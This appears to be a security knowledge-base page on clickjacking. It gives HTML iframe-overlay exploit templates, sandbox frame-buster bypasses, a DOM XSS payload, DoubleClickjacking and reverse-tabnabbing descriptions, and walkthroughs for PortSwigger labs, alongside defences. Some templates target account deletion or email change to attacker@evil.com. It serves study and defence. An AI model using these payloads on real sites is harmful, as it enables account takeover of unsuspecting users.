---
title: "Clickjacking"
type: technique
tags: [clickjacking, client-side, exploitation, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-17
sources: [payloadsallthethings-clickjacking, payloadsallthethings-tabnabbing, git-portswigger-all-labs, yibelo-doubleclickjacking]
---

## What it is

Clickjacking (UI Redressing) is a type of web security vulnerability where a malicious website tricks a user into clicking on something different from what the user perceives, causing the user to perform unintended actions without their knowledge or consent.

It is often combined with other vulnerabilities to increase impact:
- **Cross-Site Scripting (XSS)** — enhances payload injection into frames (see DOM XSS combo below)
- **Inadequate CSP** — allows framing from malicious origins
- **IDOR** — can trick users into unintended actions like changing email, deleting accounts, or transferring money

## Methodology

### UI Redressing
Overlaying a transparent UI element on top of a legitimate website. The attacker creates a transparent HTML element (`<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">`) covering the viewport, placing deceptive elements within it.

### Invisible Frames
Using hidden iframes to trick users into interacting with content from another website unknowingly. The iframe is made invisible by setting its dimensions to zero or opacity to 0 (`<iframe src="malicious-site" style="opacity: 0;"></iframe>`).

### Button/Form Hijacking
Overlaying invisible elements on top of visible buttons or forms. When the user clicks the visible element, they trigger the hidden form's submission.

The standard iframe overlay pattern uses two layers with z-index control:
- `z-index: 2` on the iframe (topmost, invisible)
- `z-index: 1` on the decoy content (visible behind)
- `opacity: 0.1` (testing) → `opacity: 0.0001` (production)

The decoy button must be positioned (via `top`/`left` on an absolutely positioned child) to align with the target action button pixel-precisely.

### Prefilled Form Attack
When a target page accepts GET parameters that prefill form fields, an attacker can load the iframe with those parameters pre-set. The user sees only the decoy prompt and clicks what appears to be an innocuous button, but the hidden iframe submits an attacker-controlled value.

Pattern: `https://target.com/my-account?email=attacker@evil.com`

Note: JavaScript cannot access iframe contents due to the Same-Origin Policy — the URL parameter technique is the correct approach.

### Multistep Clickjacking
When a sensitive action requires a confirmation dialog (e.g., Delete → Confirm), the attacker must convince the user to click twice. Two decoy elements are positioned to align with each step sequentially. Social engineering determines click order (e.g., numbered instructions, rage-bait content).

### Frame-Busting Bypass (sandbox attribute)
Frame-busting scripts typically check `window != top` and redirect or wipe the page if framed. The HTML5 `sandbox` attribute on the iframe disables JavaScript execution in the framed page, neutralising the frame-busting script while still allowing the desired interaction.

- `sandbox="allow-forms"` — disables scripts, allows form submission
- `sandbox="allow-scripts allow-forms"` — keeps scripts but grants more permissions (less effective for bypass)

For pure form-submission attacks, `sandbox="allow-forms"` is sufficient.

### OnBeforeUnload Event (Frame Busting Bypass)
The `onBeforeUnload` event can be used to evade frame busting code. The attacker registers an unload event on the top page that repeatedly submits navigation requests to a 204 No Content page, effectively canceling the frame busting redirection.

### DOM XSS + Clickjacking Combo
If a frameable page has a DOM-based XSS sink reachable via GET parameters, the attacker can prefill the XSS payload via the iframe URL and use clickjacking to trigger form submission. The user clicks "Submit", which fires the XSS in the context of the target origin.

Pattern:
```
/feedback?name=</span><img src=x onerror=print()><span>&email=a@a.com&subject=a&message=a
```

URL-encode the payload when embedding in the iframe `src`.

### XSS Filter Bypasses
- **IE8 XSS filter**: Disable frame busting scripts by inserting the beginning of the frame busting script into a request parameter.
- **Chrome XSSAuditor filter**: Deactivate a script by passing its code in a request parameter to target the specific snippet containing the frame busting code.

## Execution Examples

**Standard iframe overlay (CSRF bypass, button hijack)**:
```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 600px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 600px;
      height: 600px;
      z-index: 1;
    }
    #btn {
      position: absolute;
      top: 480px;
      left: 90px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <button id="btn">Click here</button>
  </div>
  <iframe id="target_website" src="https://TARGET/my-account"></iframe>
</body>
```

**Prefilled form attack** (email change via URL parameter):
```html
<iframe id="target_website"
  src="https://TARGET/my-account?email=attacker@evil.com"
  ...>
</iframe>
```

**Frame-busting bypass** (`sandbox="allow-forms"`):
```html
<iframe id="target_website"
  src="https://TARGET/my-account?email=attacker@evil.com"
  sandbox="allow-forms">
</iframe>
```

**DOM XSS combo** (URL-encoded XSS payload in iframe src):
```html
<iframe id="target_website"
  src="https://TARGET/feedback?name=%3C/span%3E%3Cimg%20src=x%20onerror=print()%3E%3Cspan%3E&email=a@a.com&subject=a&message=a">
</iframe>
```

**Multistep clickjacking** (two decoy buttons for two-click confirmation):
```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 600px;
      height: 600px;
      opacity: 0.1;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 600px;
      height: 600px;
      z-index: 1;
    }
    #btn1 {
      position: absolute;
      top: 480px;
      left: 90px;
    }
    #btn2 {
      position: absolute;
      top: 300px;
      left: 200px;
    }
  </style>
</head>
<body>
  <div id="decoy_website">
    <button id="btn1">Click me first</button>
    <button id="btn2">Click me next</button>
  </div>
  <iframe id="target_website" src="https://TARGET/my-account"></iframe>
</body>
```

## DoubleClickjacking (2024)

DoubleClickjacking (Paulos Yibelo, December 2024) bypasses all classic clickjacking defences - `X-Frame-Options`, CSP `frame-ancestors`, and `SameSite=Lax/Strict` cookies - because it does not frame the target at all. It abuses the timing gap between the two clicks of a double-click.

Flow:
1. The victim visits the attacker page, which opens a new window/popup (for example a fake CAPTCHA) asking them to double-click.
2. Between the first `mousedown` and the second click, the attacker's opener page uses `window.location` to navigate itself to the real target's sensitive action (an OAuth consent, "authorize app", "confirm" button), and closes or replaces the popup so the second click lands on the target.
3. The victim's second click is delivered to the legitimate, top-level target page (no iframe), so frame busting and `X-Frame-Options` never apply, and because it is a same-site top-level interaction, `SameSite` cookies are sent.

Impact: demonstrated account takeover on Shopify, Slack, and Salesforce; also OAuth app authorization, browser-extension permission grants, and Web3 transaction approval. With no iframe, this is a top-level UI redress, not framed clickjacking, so framing headers do not mitigate it.

Defence: disable sensitive buttons by default and enable them only after a genuine gesture (real mousemove/keypress) on the actual page; framing headers do not help here.

## Testing

### Detecting frameability
- In Burp Suite, check response headers for absence of `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`.
- A "Frameable response" issue in Burp's active scanner confirms the target is vulnerable.

### Clickbandit (Burp Suite)
Automated PoC generation:
1. Open the target page in Burp's browser.
2. Go to **Burp > Clickbandit** and click **Copy Clickbandit to clipboard**.
3. Paste the script into the browser DevTools console.
4. Click **Start**, interact with buttons and forms on the target page.
5. Click **Finish** to enter Review mode — verify each click overlay aligns.
6. Use `+`/`-` to zoom and arrow keys to reposition the iframe.
7. Click **Save** to download the PoC HTML file.

## Preventive Measures
- **X-Frame-Options Header**: Implement `X-Frame-Options: SAMEORIGIN` or `DENY`.
  - `DENY` — prevents framing by any origin
  - `SAMEORIGIN` — allows framing only by same-origin pages
  - `ALLOW-FROM URI` — specific trusted URI (limited browser support)
- **Content Security Policy (CSP)**: `frame-ancestors 'self';` or specific domains. Modern browsers prefer this over `X-Frame-Options`.
- **Sandbox Attribute**: HTML5 `<iframe sandbox>` can restrict JavaScript and top-level navigation — but note this is a *server-side* control only if you control the framing page; it does not protect the framed target.
- **Confirmation dialogs**: Multi-step sensitive actions raise the cost of attack (but do not prevent multistep clickjacking).

## Reverse Tabnabbing

Reverse tabnabbing occurs when a page linked from the target page (e.g., `target="_blank"`) can rewrite the original page's location (using `window.opener.location = "http://evil.com"`) to a phishing site. If the user authenticates on the fake page thinking it's the original, their credentials are stolen.

**Prevention:** Ensure external links use `rel="noopener"` or `rel="noreferrer"`.

## Tools
- `clickjack` (machine1337)
- [[burp-suite]] — Clickbandit tool to generate PoC (Burp > Clickbandit)

---

## PortSwigger Labs

### LAB 1 — Basic clickjacking with CSRF token protection (Apprentice)

**Concept:** CSRF tokens do not protect against clickjacking. The framed page is loaded from the real server with a valid token already embedded; the attacker only needs the user to click the overlaid button.

**Steps:**
1. Log in as `wiener:peter` to identify the target button (Delete account at `/my-account`).
2. Craft the iframe overlay HTML with a decoy "Click" button positioned over the Delete button (`top: 480px; left: 90px` — adjust to target).
3. Set iframe opacity to `0.1` for alignment testing, then `0.0001` for delivery.
4. Deliver to victim. The CSRF token is irrelevant — the real page handles it transparently.

---

### LAB 2 — Clickjacking with form input data prefilled from a URL parameter (Apprentice)

**Concept:** The email change form at `/my-account` accepts a prefilled value via `?email=`. An attacker loads the iframe with `?email=attacker@evil.com`, positions a decoy "Update email" button over the real submit button, and tricks the victim into clicking.

**Steps:**
1. Confirm the `?email=` parameter prefills the form field (visit `/my-account?email=test@test.com`).
2. Build the iframe overlay with `src="https://TARGET/my-account?email=attacker@evil.com"`.
3. Position the decoy button over "Update email" (`top: 440px; left: 70px`).
4. Set opacity to `0.0001` and deliver.

---

### LAB 3 — Clickjacking with a frame buster script (Apprentice)

**Concept:** The target page contains a frame-busting script that checks `window != top` and wipes the page if framed. Bypassed with `sandbox="allow-forms"` on the iframe, which disables the script while still allowing form submission.

**Steps:**
1. Attempt to frame the page normally — confirm the frame-buster fires and blanks the iframe content.
2. Add `sandbox="allow-forms"` to the iframe element.
3. Confirm the page now loads correctly inside the frame (scripts are disabled, form still works).
4. Position the decoy button and deliver.

---

### LAB 4 — Exploiting clickjacking vulnerability to trigger DOM-based XSS (Practitioner)

**Concept:** The feedback form at `/feedback` reflects the `name` GET parameter into a DOM sink without sanitisation. The page is frameable. Combine clickjacking (user clicks "Submit") with a URL-parameter XSS payload in the iframe src to trigger DOM XSS in the target origin.

**XSS sink:** The `name` field value is reflected inside a `<span>` tag — inject `</span><img src=x onerror=print()><span>` to break out.

**Steps:**
1. Identify the XSS via the feedback form: submit `</span><img src=x onerror=alert(1)><span>` as the name.
2. Confirm GET parameters populate all fields: `/feedback?name=PAYLOAD&email=a@a.com&subject=a&message=a`.
3. URL-encode the XSS payload and embed it in the iframe src.
4. Position decoy "Click me" button over the Submit button.
5. Set opacity to `0.0001`, store, and deliver to victim — the XSS fires on click.

---

### LAB 5 — Multistep clickjacking (Practitioner)

**Concept:** The Delete account action requires a two-step confirmation (click Delete → click Confirm). The attacker must position two separate decoy buttons to sequentially overlay both steps. Social engineering must ensure the victim clicks both in the correct order.

**Steps:**
1. Log in as `wiener:peter`. Identify the two-click flow: Delete account button → confirmation dialog button.
2. Note that direct CSRF of `/my-account/delete` is blocked (CSRF token + no GET support).
3. Craft the overlay with two decoy buttons, each precisely positioned to align with the corresponding step.
4. Use instructional text on the decoy page (e.g., "Click me first", "Click me next") to guide click order.
5. Align at opacity `0.1`, reduce to `0.0001`, deliver.
